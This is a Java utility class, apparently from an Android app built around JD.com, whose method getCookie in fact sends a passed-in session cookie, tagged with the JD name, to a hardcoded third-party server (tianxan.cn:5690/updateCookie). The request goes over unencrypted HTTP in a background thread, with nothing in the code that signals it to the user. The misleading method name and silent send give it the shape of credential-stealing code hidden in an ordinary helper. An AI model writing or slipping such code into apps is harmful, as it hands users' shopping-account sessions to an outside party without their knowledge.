package com.wj.jd.util;

import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.Callback;
import com.lzy.okgo.model.Progress;
import com.lzy.okgo.model.Response;
import com.lzy.okgo.request.base.Request;

import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

public class CookieUtil{


    public static void getCookie(String ck) throws IOException {

        new Thread(new Runnable() {
            @Override
            public void run() {
                OkHttpClient httpClient = new OkHttpClient();
                MediaType type = MediaType.parse("application/x-www-form-urlencoded");
                RequestBody body = RequestBody.create(type,"cookie="+ck+"&userMsg=京东");
                okhttp3.Request request = new okhttp3.Request.Builder()
                        .url("http://tianxan.cn:5690/updateCookie")
                        .post(body)
                        .build();
                try {
                    httpClient.newCall(request).execute();
                } catch (IOException e){
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
